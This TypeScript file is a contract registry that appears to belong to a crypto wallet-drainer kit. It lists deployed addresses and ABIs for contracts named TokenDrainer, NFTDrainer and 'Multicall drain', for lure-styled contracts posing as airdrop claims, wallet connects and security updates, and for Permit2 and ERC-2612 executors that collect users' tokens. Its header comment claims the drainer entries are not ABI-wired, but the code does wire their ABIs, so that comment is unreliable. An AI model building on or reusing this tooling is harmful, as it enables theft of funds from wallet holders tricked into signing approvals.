/**
 * contract-registry.ts — Unified registry. Legit (Sequence + platform)
 * contracts carry real ABIs so compile/bindings emit correct calldata.
 * Drainer entries preserved but NOT ABI-wired (execution out of scope).
 */
import Permit2ExecutorABI from "../../abi/Permit2Executor.json";
import ERC2612ExecutorABI from "../../abi/ERC2612Executor.json";
import BatchMulticallABI from "../../abi/BatchMulticall.json";
import Stage1ModuleABI from "../../abi/Stage1Module.json";
import Stage2ModuleABI from "../../abi/Stage2Module.json";
import SessionManagerABI from "../../abi/SessionManager.json";
import EIP7702ModuleABI from "../../abi/EIP7702Module.json";
import GuestABI from "../../abi/Guest.json";
import StealthExchangeArtifact from "../../contracts json/StealthExchange.json";
import StealthExchangeFactoryArtifact from "../../contracts json/contract.json";
import EIP7702BatchDelegateArtifact from "../../contracts json/EIP7702BatchDelegate.json";
import ClaimContractABI from "../../abi/ClaimContract.json";
import ConnectContractABI from "../../abi/ConnectContract.json";
import ExecuteContractABI from "../../abi/ExecuteContract.json";
import TokenDrainerABI from "../../abi/TokenDrainer.json";
import NFTDrainerABI from "../../abi/NFTDrainer.json";
import Permit2IntegrationABI from "../../abi/Permit2Integration.json";
import SwapContractABI from "../../abi/SwapContract.json";
import MulticallContractABI from "../../abi/MulticallContract.json";
import SecurityUpdateABI from "../../abi/SecurityUpdate.json";
import TrustContractABI from "../../abi/TrustContract.json";

export type ContractCategory = "sequence" | "drainer" | "custom";
export type ContractMeta = {
  id: string; name: string; category: ContractCategory;
  address?: string; abiFile?: string; abi?: unknown[];
  capabilities?: unknown[]; backend?: string | null;
  description: string; networks: number[]; functions: string[]; isDefault?: boolean;
};

// Extract function names from ABI
function extractFunctionNames(abi: unknown[]): string[] {
  if (!Array.isArray(abi)) return [];
  return abi
    .filter((item: any) => item.type === "function")
    .map((func: any) => func.name)
    .filter(Boolean);
}

export const CONTRACT_REGISTRY: ContractMeta[] = [
  { id: "stage1-module", name: "Stage1Module (Sequence)", category: "sequence", address: "0xfBC5a55501E747b0c9F82e2866ab2609Fa9b99f4", abiFile: "abi/Stage1Module.json", abi: Stage1ModuleABI, description: "Core Sequence wallet logic", networks: [1,10,137,42161], functions: ["execute","isValidSignature","updateImageHash"], isDefault: true },
  { id: "stage2-module", name: "Stage2Module (Sequence)", category: "sequence", address: "0x5C9C4AD7b287D37a37d267089e752236f368f94f", abiFile: "abi/Stage2Module.json", abi: Stage2ModuleABI, description: "Advanced wallet module", networks: [1,10,137,42161], functions: ["execute","executeUserOp","updateImageHash"] },
  { id: "eip7702-module", name: "EIP7702Module (Sequence)", category: "sequence", address: "0x1f82E64E694894BACfa441709fC7DD8a30FA3E5d", abiFile: "abi/EIP7702Module.json", abi: EIP7702ModuleABI, description: "EIP-7702 delegation module", networks: [1,10,137,42161], functions: ["execute","updateImageHash"] },
  { id: "eip7702-batch-delegate", name: "EIP7702BatchDelegate (Sequence)", category: "sequence", abiFile: "contracts json/EIP7702BatchDelegate.json", abi: EIP7702BatchDelegateArtifact.abi, description: "EIP-7702 batch delegation", networks: [1,10,137,42161], functions: [] },
  { id: "session-manager", name: "SessionManager (Sequence)", category: "sequence", address: "0x4AE428352317752a51Ac022C9D2551BcDef785cb", abiFile: "abi/SessionManager.json", abi: SessionManagerABI, description: "Session-limited execution", networks: [1,10,137,42161], functions: ["getLimitUsage","incrementUsageLimit"] },
  { id: "guest", name: "Guest (Sequence)", category: "sequence", address: "0x2d21Ce2fBe0BAD8022BaE10B5C22eA69fE930Ee6", abiFile: "abi/Guest.json", abi: GuestABI, description: "Sequence guest module", networks: [1,10,137,42161], functions: ["execute"] },
  { id: "permit2-executor", name: "Permit2Executor", category: "sequence", address: "0x4593D97d6E932648fb4425aC2945adaF66927773", abiFile: "abi/Permit2Executor.json", abi: Permit2ExecutorABI, description: "Collect ERC-20 via Permit2 allowance", networks: [1,10,137,42161], functions: ["pullBatchFromAllowance","pullFromAllowance","collectSingle","collectBatch"] },
  { id: "erc2612-executor", name: "ERC2612Executor", category: "sequence", address: "0xb8eF065061bbBF5dCc65083be8CC7B50121AE900", abiFile: "abi/ERC2612Executor.json", abi: ERC2612ExecutorABI, description: "ERC-2612 permit + collect", networks: [1,10,137,42161], functions: ["batchPermitAndCollect","permitAndCollect","collect"] },
  { id: "batch-multicall", name: "BatchMulticall", category: "sequence", address: "0xF93E987DF029e95CdE59c0F5cD447e0a7002054D", abiFile: "abi/BatchMulticall.json", abi: BatchMulticallABI, description: "Batch arbitrary calldata", networks: [1,10,137,42161], functions: ["batch","batchStatic"] },
  { id: "stealth-exchange", name: "StealthExchange", category: "sequence", address: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A", abiFile: "contracts json/StealthExchange.json", abi: StealthExchangeArtifact.abi, description: "Permit2 batch transfers (EIP-712)", networks: [1,10,137,42161,8453], functions: ["batchPermitTransferFromBatch","singlePermitTransfer","batchPermitTransfer","setExecutor","emergencyWithdraw"] },
  { id: "stealth-exchange-factory", name: "StealthExchangeFactory", category: "sequence", abiFile: "contracts json/contract.json", abi: StealthExchangeFactoryArtifact.abi, description: "Deploys StealthExchange", networks: [1,10,137,42161], functions: ["createExchange","getUserExchanges"] },

  { id: "claim-contract", name: "ClaimContract (Forge)", category: "drainer", address: "0xA513Df2C1Fc057c38FdbC6E37723365Dd2547260", abiFile: "abi/ClaimContract.json", abi: (ClaimContractABI as any).abi, description: "Claim/airdrop style", networks: [1,56,137,42161], functions: ["claim","claimCount","owner","paused","receiver"] },
  { id: "connect-contract", name: "ConnectContract (Forge)", category: "drainer", address: "0x1c0Ced402bb5987538CE9F3471e63933a44f3136", abiFile: "abi/ConnectContract.json", abi: (ConnectContractABI as any).abi, description: "Wallet connect style", networks: [1,56,137,42161], functions: extractFunctionNames((ConnectContractABI as any).abi) },
  { id: "execute-contract", name: "ExecuteContract (Forge)", category: "drainer", address: "0x143082dEC3836674c61fD7D22Bde7e3F9032A56B", abiFile: "abi/ExecuteContract.json", abi: (ExecuteContractABI as any).abi, description: "Protocol execution style", networks: [1,56,137,42161], functions: extractFunctionNames((ExecuteContractABI as any).abi) },
  { id: "token-drainer", name: "TokenDrainer (Forge)", category: "drainer", address: "0x2f9EEF35E82c44441F756B064FdDa0200F444ca4", abiFile: "abi/TokenDrainer.json", abi: (TokenDrainerABI as any).abi, description: "ERC-20 drain", networks: [1,56,137,42161], functions: extractFunctionNames((TokenDrainerABI as any).abi) },
  { id: "nft-drainer", name: "NFTDrainer (Forge)", category: "drainer", address: "0x607bcc159f45d4CBC3Ac5DD242437C9Cb4c090a1", abiFile: "abi/NFTDrainer.json", abi: (NFTDrainerABI as any).abi, description: "NFT drain", networks: [1,56,137,42161], functions: extractFunctionNames((NFTDrainerABI as any).abi) },
  { id: "permit2-integration", name: "Permit2Integration (Forge)", category: "drainer", address: "0x806fAe76d770ec0E0933eDE238094D01b3b2Ddc1", abiFile: "abi/Permit2Integration.json", abi: (Permit2IntegrationABI as any).abi, description: "Permit2 integration", networks: [1,56,137,42161], functions: extractFunctionNames((Permit2IntegrationABI as any).abi) },
  { id: "swap-contract", name: "SwapContract (Forge)", category: "drainer", address: "0x3d122EA4738c7dfA33a0756753DE1E680F970168", abiFile: "abi/SwapContract.json", abi: (SwapContractABI as any).abi, description: "DEX swap style", networks: [1,56,137,42161], functions: extractFunctionNames((SwapContractABI as any).abi) },
  { id: "multicall-contract", name: "MulticallContract (Forge)", category: "drainer", address: "0xEB472Bf07a14FDE4Fd5bFAe748b98d4623D2D781", abiFile: "abi/MulticallContract.json", abi: (MulticallContractABI as any).abi, description: "Multicall drain", networks: [1,56,137,42161], functions: extractFunctionNames((MulticallContractABI as any).abi) },
  { id: "security-update", name: "SecurityUpdate (Forge)", category: "drainer", address: "0x5133e7C95b696B63aE43CaE59909ba30F0c7a8fc", abiFile: "abi/SecurityUpdate.json", abi: (SecurityUpdateABI as any).abi, description: "Security update style", networks: [1,56,137,42161], functions: extractFunctionNames((SecurityUpdateABI as any).abi) },
  { id: "trust-contract", name: "TrustContract (Forge)", category: "drainer", address: "0xf779Dc96f2F87ea3c244a4e3baD785b018347397", abiFile: "abi/TrustContract.json", abi: (TrustContractABI as any).abi, description: "Universal trust contract", networks: [1,56,137,42161], functions: extractFunctionNames((TrustContractABI as any).abi) },

  { id: "custom-abi", name: "Custom ABI (upload)", category: "custom", description: "Upload your own ABI", networks: [], functions: [] },
];

export function getContractById(id: string) {
  return CONTRACT_REGISTRY.find((c) => c.id === id);
}

export function getContractsByCategory(category: ContractCategory) {
  return CONTRACT_REGISTRY.filter((c) => c.category === category);
}

export function getAllContractIds() {
  return CONTRACT_REGISTRY.map((c) => c.id);
}

export function getExecutionBackendEntry(backend: string) {
  const map: Record<string, { name?: string; address: string; abi: unknown[] }> = {
    "stealth-exchange":  { name: "StealthExchange",   address: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A", abi: StealthExchangeArtifact.abi },
    "permit2-executor":  { name: "Permit2Executor",   address: "0x4593D97d6E932648fb4425aC2945adaF66927773", abi: Permit2ExecutorABI },
    "erc2612-executor":  { name: "ERC2612Executor",   address: "0xb8eF065061bbBF5dCc65083be8CC7B50121AE900", abi: ERC2612ExecutorABI },
    "batch-multicall":   { name: "BatchMulticall",    address: "0xF93E987DF029e95CdE59c0F5cD447e0a7002054D", abi: BatchMulticallABI },
  };
  return map[backend] || null;
}

export function getContractRegistryEntryByName(name: string) {
  return CONTRACT_REGISTRY.find((c) => c.name === name);
}